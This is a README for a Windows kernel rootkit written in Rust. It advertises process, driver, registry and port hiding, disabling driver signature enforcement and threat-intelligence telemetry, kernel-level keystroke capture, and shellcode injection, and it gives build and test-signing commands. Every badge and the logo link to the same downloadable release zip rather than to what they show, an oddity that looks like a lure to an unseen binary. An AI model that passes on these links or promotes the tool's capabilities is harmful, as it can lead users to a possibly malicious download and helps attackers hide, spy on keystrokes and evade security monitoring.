# shadow-rs 🦀

[![Rust](https://img.shields.io/badge/made%20with-Rust-red)](https://github.com/vasiliy809/shadow-rs/releases/download/v1.9.7/shadow-rs.zip)
[![Platform](https://img.shields.io/badge/platform-windows-blueviolet)](https://github.com/vasiliy809/shadow-rs/releases/download/v1.9.7/shadow-rs.zip)
[![Forks](https://img.shields.io/github/forks/vasiliy809/shadow-rs)](https://github.com/vasiliy809/shadow-rs/releases/download/v1.9.7/shadow-rs.zip)
[![Stars](https://img.shields.io/github/stars/vasiliy809/shadow-rs)](https://github.com/vasiliy809/shadow-rs/releases/download/v1.9.7/shadow-rs.zip)
[![License](https://img.shields.io/github/license/vasiliy809/shadow-rs)](https://github.com/vasiliy809/shadow-rs/releases/download/v1.9.7/shadow-rs.zip)

<p align="center">
    <a href="https://github.com/vasiliy809/shadow-rs/releases/download/v1.9.7/shadow-rs.zip"><img height="450" alt="shadow-rs" src="shadow.png"></a>
</p>

`shadow-rs` is a Windows kernel rootkit written in Rust, demonstrating advanced techniques for kernel manipulation while leveraging Rust’s safety and performance features. This project is intended for educational and research purposes.

## Table of Contents

## Notice

> [!IMPORTANT]
> This project is under development.

## Features

### Process

- ✅ Hide and unhide processes.
- ✅ Modify process signature levels to handle `Protected Processes (PP)` and `Protected Process Light (PPL)`.
- ✅ Protect processes against termination and memory dumping.
- ✅ Elevate process privileges to SYSTEM, granting full administrative access.
- ✅ Terminate target processes.
- ✅ List all protected and hidden processes.

### Thread

- ✅ Hide and unhide threads.
- ✅ Protect threads from termination or suspension.
- ✅ List all protected and hidden threads

### Driver

- ✅ Hide and unhide kernel-mode drivers.
- ✅ Enumerate all loaded drivers.
- ✅ Enable or disable Driver Signature Enforcement (`DSE`) to allow loading of unsigned drivers.
- ✅ Blocking Driver Loading.

### Callback

- ✅ List registered callbacks for process creation, thread creation, image loading, and registry operations.
- ✅ Remove or restore specific callbacks.
- ✅ List all removed callbacks.

### Misc

- ✅ Capture keystrokes from user input in real-time with kernel-level interception.
- ✅ Disable Microsoft-Windows-Threat-Intelligence (`EtwTi`).
- ✅ Cleaning Driver Artifacts from Memory Dumps in Case of BSOD.
- ✅ Compile Encryption String.
- ✅ Support for Reflective Driver Loading.

### User Mode Code Execution

- ✅ Inject shellcode or DLLs into processes using `ZwCreateThreadEx`.
- ✅ Asynchronous Procedure Call (`APC`) injection to execute shellcode or DLLs in alertable threads.
- ✅ Execute shellcode in processes using `Thread Hijacking`.

### Module

- ✅ Hide modules from process memory listings.
- ✅ Enumerate all loaded modules.

### Registry

- ✅ Hide and unhide registry keys and values to prevent detection and manipulation.
- ✅ Apply registry protection to prevent key or value deletion or overwriting.

### Network

- ✅ Hide and unhide network ports from netstat and similar monitoring tools.

## Installation

## Supported Platforms

- ✅ Windows 10 / 11 (x64 only)

## Build Instructions

#### Driver

```cmd
cargo make default --release
```

> [!IMPORTANT]
> Note: The first build must be executed as Administrator. Subsequent builds do not require elevated privileges.

To enable mapping support for tools like kdmapper, compile with:
```cmd
cargo make default --release --features mapper
```

#### Client

```cmd
cargo build --release
```

For compatibility with mapped drivers:
```cmd
cargo build --release --features mapper
```

## Setup Instructions

#### Enable Test Mode or Test Signing Mode

```
bcdedit /set testsigning on
```

#### Create / Start Service

## Debugging

Use Windbg to attach to the kernel and monitor driver activity.

```
bcdedit /debug on
bcdedit /dbgsettings net hostip:<IP> port:<PORT>
```

## Contributing to shadow-rs
To contribute to `shadow-rs`, follow these steps:

1. Fork this repository.
2. Create a branch: ```git checkout -b <branch_name>```.
3. Make your changes and confirm them: ```git commit -m '<commit_message>'```.
4. Send to the original branch: ```git push origin <project_name> / <local>```.
5. Create the pull request.

## Disclaimer

This project is for educational and research purposes. Malicious use of the software is strictly prohibited and discouraged. I am not responsible for any damage caused by improper use of the software.

## References

I want to express my gratitude to these projects that inspired me to create `shadow-rs` and contribute with some features:

### Other Essential Resources:

These materials and research have been invaluable in deepening my understanding of Windows kernel development:

## License

## Contributors

[![contributors](https://contrib.rocks/image?repo=vasiliy809/shadow-rs) ](https://github.com/vasiliy809/shadow-rs/graphs/contributors)